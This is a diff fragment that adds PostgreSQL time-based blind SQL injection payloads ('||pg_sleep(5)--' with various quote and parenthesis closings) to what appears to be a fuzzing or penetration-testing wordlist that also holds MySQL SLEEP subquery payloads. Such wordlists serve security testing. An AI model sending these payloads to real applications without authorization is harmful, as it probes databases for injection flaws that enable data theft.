@@ -40,6 +40,16 @@ pg_sleep(5)--
 1)) or pg_sleep(5)--
 ")) or pg_sleep(5)--
 ')) or pg_sleep(5)--
+||pg_sleep(5)--
+1||pg_sleep(5)--
+"||pg_sleep(5)--
+'||pg_sleep(5)--
+1)||pg_sleep(5)--
+")||pg_sleep(5)--
+')||pg_sleep(5)--
+1))||pg_sleep(5)--
+"))||pg_sleep(5)--
+'))||pg_sleep(5)--
 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
